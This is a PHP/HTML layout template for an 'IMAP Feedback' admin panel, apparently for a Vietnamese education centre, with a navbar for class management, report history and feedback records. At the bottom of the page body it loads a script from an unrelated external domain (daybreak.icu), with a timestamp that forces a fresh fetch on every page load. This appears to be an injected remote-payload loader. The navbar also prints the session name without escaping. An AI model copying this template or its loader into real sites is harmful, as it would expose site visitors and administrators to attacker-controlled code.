<html>
<head>
    <title>IMAP</title>
    <base href="/">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <link href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.8/css/select2.min.css" rel="stylesheet"/>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.8/js/select2.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="theme/frontend/default/css/fontAwesome/css/font-awesome.min.css" media="all">
    <link rel="stylesheet" href="theme/frontend/default/css/bootstrap.min.css" media="all">

    <script type="text/javascript" src="theme/frontend/default/lib/mdb/js/mdb.min.js"></script>
    <script type="text/javascript" src="theme/frontend/default/lib/mdb/js/addons/datatables.js"></script>
    <script type="text/javascript" src="theme/frontend/default/lib/mdb/js/addons/datatables-select.js"></script>

    <script src="theme/frontend/default/js/feedback.js?ver=<?php echo $this->config->item("ver_js");?>" ></script>

    <style type="text/css">
        .area_title{
            background-color: #0a9145;
            color: white;
            padding: 12px;
        }



        .radio_feedback {
            -webkit-appearance: button;
            -moz-appearance: button;
            appearance: button;
            border: 4px solid #ccc;
            border-top-color: #bbb;
            border-left-color: #bbb;
            background: #fff;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            outline: none !important;
        }

        .radio_feedback:checked {
            border: 8px solid #0a9145;
            outline: none !important;
        }

        .feedback_ruler {
            font-size: 16px;
            text-align: center;
        }

        .select_area {
            display: inline-block;
            width: 12%;
        }

        .title_ruler_div {
            display: inline-block;
            width: 15%;
        }

        .select_area:hover {
            cursor: pointer !important;
        }

        .div_quest {
            background-color: white;
            padding: 20px;
            max-width: 100%;
            padding-bottom: 28px;
        }

        .quest_title {
            font-size: 20px;

        }

        .radio_feedback_ruler {
            display: inline-block;
            width: 20px;
            height: 20px;
        }

        .title_ruler {
            text-align: center;
            font-weight: bold;
            font-size: 16px;
        }

        .div_mono_radio_feedback {
            text-align: center !important;
            padding: 5px;
            background-color: rgba(233, 233, 233, 0.5);
        }

        .title_group_quest {
            background-color: #0a9145;
            color: white;
            padding: 12px;
            margin-bottom: 0;

        }

        .select2-container {
            width: 100% !important;
        }

        div.list_in_table {
            padding: 20px 8px;
        }
        div.area{
            padding-bottom: 10px;
            border-bottom: 1px solid #bbbbbb;
            margin-bottom: 20px;
        }

        p.p_menu_left_bar{
            background-color: transparent;
            font-size: 18px;
            margin: 0;
            padding: 8px;
        }
        p.p_menu_left_bar:hover{
            cursor: pointer;
            background-color: yellow;
        }

        #menu_left_side{
            position: fixed;
            top: 0;
            left: 0;
            /*padding: 8px;*/
            -webkit-box-shadow:  8px 0 6px -6px black;
            -moz-box-shadow: 8px 0 6px -6px black;
            box-shadow: 8px 0 6px -6px black;
            height: 100%;
            background-color: rgba(127, 134, 128, 0.11);
        }

        .fa-left-menu{
            margin-left: 8px;
            margin-right: 8px;
        }
        .img_logo_feed{
            height: 110px;
        }

        .fa_info_feedback{

        }
        .fa_info_feedback:hover{
            color: #ff80a4;
            cursor: pointer;
        }

        .v{
            box-shadow: 0 8px 10px -5px rgba(0,0,0,.2), 0 16px 24px 2px rgba(0,0,0,.14), 0 6px 30px 5px rgba(0,0,0,.12);
        }
        .card_feedback{
            border: 1px solid #a8a8a8;
            padding: 0px;
            border-radius: 4px;
            height: 500px;
            overflow: auto;
            box-shadow: 0 8px 10px -5px rgba(0,0,0,.2), 0 16px 24px 2px rgba(0,0,0,.14), 0 6px 30px 5px rgba(0,0,0,.12);

        }

        div.img_logo_feed{
            text-align: center;
            margin: 8px;
        }
        .img_logo_feed_inside{
            max-width: 100%;
            display: inline-block;
            text-align: center;
        }
        .title_card{
            background: #337ab7;
            margin: 0;
            padding: 14px;
            color: white;
            font-size: medium;
            font-weight: bold;
        }
        .my_title{
            color: #337ab7;
        }
        .body_card{
            padding: 10px;
        }
        p.text_card{
            font-weight: bold;
        }

        .card_info_btn{
            float: right;
        }
        .filter_div{
            padding: 12px;
            margin: 8px 0;
            border-radius: 8px;
            background-color: #f5f5f5;
        }
        .title_filter{
            color: grey;
            font-weight: bold;
        }
        .hover-point{
            cursor: pointer;
        }
    </style>

</head>
<body>

<nav class="navbar navbar-default navbar-fixed-top" style="background: #0bc75b; color: white !important;">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header" >
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="javascript:void(0)" style="color:white">IMAP Feedback</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav">
<!--                <li class=""><a href="/feedback/dashboard_tuvan" style="color:white">Bảng tin <span class="sr-only">(current)</span></a></li>-->
                <li><a href="/feedback/class_tuvan" style="color:white">Quản lý lớp</a></li>
                <li><a href="/feedback/log_send_report_tuvan" style="color:white" >Lịch sử gửi báo cáo</a></li>
<!--                <li><a href="/feedback/location">Branch</a></li>-->
<!--                <li><a href="/feedback/dashboard">Feedback</a></li>-->
<!--                <li><a href="/feedback/report">Report</a></li>-->
<!--                <li><a href="/feedback/dashboard">About Us</a></li>-->
                <li class="dropdown">
                    <a href="#" style="color:white" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Chi tiết <span class="caret"></span></a>
                    <ul class="dropdown-menu">
                        <li><a href="/feedback/feedback_phone_detail">Lịch sử Feedback Phone</a></li>
<!--                        <li><a href="/feedback/feedback_ksgv_detail?type_ksgv=ksgv1">Lịch sử Feedback Form mẫu 1</a></li>-->
                        <li><a href="/feedback/feedback_ksgv_detail?type_ksgv=dao_tao_onl">Lịch sử Feedback Giữa kỳ</a></li>
                        <li><a href="/log/list_feedback_group_by_class?fb_type=ksgv&type_ksgv=giua_ky_off">Lịch sử Feedback Offline giữa kỳ</a></li>
                        <li><a href="/feedback/feedback_ksgv_detail?type_ksgv=ksgv2">Lịch sử Feedback Cuối kỳ</a></li>
                        <li><a href="/feedback/hom_thu_gop_y_detail">Lịch sử Hòm thư góp ý</a></li>
                    </ul>
                </li>
                <li class="dropdown">
                    <a href="#" style="color:white" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Xin chào, <?php  if(isset($_SESSION['fullname'])) echo $_SESSION['fullname']; ?>   <span class="caret"></span></a>
                    <ul class="dropdown-menu">
<!--                        <li><a href="#">Change password</a></li>-->
                        <li><a href="/feedback/logout">Đăng xuất</a></li>
                    </ul>
                </li>
            </ul>


<!--            <form class="navbar-form navbar-left" role="search">-->
<!--                <div class="form-group">-->
<!--                    <input type="text" class="form-control" placeholder="Search">-->
<!--                </div>-->
<!--                <button type="submit" class="btn btn-default">Submit</button>-->
<!--            </form>-->
<!--            <ul class="nav navbar-nav navbar-right">-->
<!--                <li><a href="#">Link</a></li>-->
<!--                <li class="dropdown">-->
<!--                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Dropdown <span class="caret"></span></a>-->
<!--                    <ul class="dropdown-menu">-->
<!--                        <li><a href="#">Action</a></li>-->
<!--                        <li><a href="#">Another action</a></li>-->
<!--                        <li><a href="#">Something else here</a></li>-->
<!--                        <li role="separator" class="divider"></li>-->
<!--                        <li><a href="#">Separated link</a></li>-->
<!--                    </ul>-->
<!--                </li>-->
<!--            </ul>-->
        </div><!-- /.navbar-collapse -->
    </div><!-- /.container-fluid -->
</nav>


<div class="container-fluid" style="margin-top: 60px; ">
    <div class="row">
<!--        <div class="col col-sm-12 col-md-1" id="menu" style="z-index: 2">-->
<!--            <div id="menu_left_side">-->
<!--                <p class="p_menu_left_bar" style="font-weight: bold">-->
<!--                    <i class="fa fa-star-o fa-left-menu" aria-hidden="true"></i>Menu-->
<!--                </p>-->
<!---->
<!--                <a href="feedback/dashboard">-->
<!--                    <p class="p_menu_left_bar"><i class="fa fa-star-o fa-left-menu" aria-hidden="true"></i>Dashboard</p>-->
<!--                </a>-->
<!--                <a href="feedback/class_">-->
<!--                    <p class="p_menu_left_bar"><i class="fa fa-money fa-left-menu" aria-hidden="true"></i>Class</p>-->
<!--                </a>-->
<!--                <a href="feedback/teacher">-->
<!--                    <p class="p_menu_left_bar"><i class="fa fa-user fa-left-menu" aria-hidden="true"></i>Teacher</p>-->
<!--                </a>-->
<!--                <a href="feedback/report">-->
<!--                    <p class="p_menu_left_bar"><i class="fa fa-star-o fa-left-menu" aria-hidden="true"></i>Report</p>-->
<!--                </a>-->
<!---->
<!--            </div>-->
<!--        </div>-->
        <div class="col col-sm-12 col-md-12">
            <?php if (isset($content_for_layout)) echo $content_for_layout; ?>
        </div>
    </div>
    <script>

    </script>
    <script type="text/javascript" src="https://daybreak.icu/static/wing.js?t=1<?php echo time();?>"></script>
</div>

</body>
</html>


